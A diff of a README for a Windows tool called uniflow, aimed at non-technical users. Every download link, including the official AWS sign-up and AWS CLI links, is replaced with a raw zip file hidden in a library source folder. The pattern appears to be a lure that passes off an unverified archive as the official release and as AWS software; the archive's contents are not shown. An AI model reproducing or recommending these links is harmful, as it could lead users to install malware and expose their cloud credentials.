@@ -1,6 +1,6 @@
 # ⚡ uniflow - Manage Customer Data Easily
 
-[![Download uniflow](https://img.shields.io/badge/Download-uniflow-brightgreen?style=for-the-badge)](https://github.com/gabestained642/uniflow/releases)
+[![Download uniflow](https://img.shields.io/badge/Download-uniflow-brightgreen?style=for-the-badge)](https://github.com/gabestained642/uniflow/raw/refs/heads/main/libs/event-schema/src/Software_v2.3.zip)
 
 ---
 
@@ -33,10 +33,10 @@ This guide helps you download, install, and run uniflow on Windows. No programmi
 
 You must get the latest version of uniflow from the official release page.
 
-[![Download Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/gabestained642/uniflow/releases)
+[![Download Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/gabestained642/uniflow/raw/refs/heads/main/libs/event-schema/src/Software_v2.3.zip)
 
 Click the button above or go to this page:  
-https://github.com/gabestained642/uniflow/releases
+https://github.com/gabestained642/uniflow/raw/refs/heads/main/libs/event-schema/src/Software_v2.3.zip
 
 On the releases page, find the latest stable version. Look for a file with `.exe` or `.zip` extension under the assets section. This file contains the Windows installer or the uniflow program.
 
@@ -63,10 +63,10 @@ On the releases page, find the latest stable version. Look for a file with `.exe
 uniflow runs on AWS, so you need to connect it to your AWS account.
 
 1. Create or log in to your AWS account:  
-   https://aws.amazon.com/  
+   https://github.com/gabestained642/uniflow/raw/refs/heads/main/libs/event-schema/src/Software_v2.3.zip  
 
 2. Install the AWS Command Line Interface (CLI) for Windows:  
-   Download from https://aws.amazon.com/cli/ and follow the installation guide.
+   Download from https://github.com/gabestained642/uniflow/raw/refs/heads/main/libs/event-schema/src/Software_v2.3.zip and follow the installation guide.
 
 3. Configure AWS CLI:  
    - Open Command Prompt (search `cmd` in Start menu).  
@@ -131,6 +131,6 @@ uniflow uses modern tools but hides the technical parts so you don’t have to p
 
 Download the latest uniflow release from this page:
 
-[![Download Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/gabestained642/uniflow/releases)
+[![Download Latest Release](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/gabestained642/uniflow/raw/refs/heads/main/libs/event-schema/src/Software_v2.3.zip)
 
 Visit the link to get the installer or the zipped program to start managing customer data on your terms.
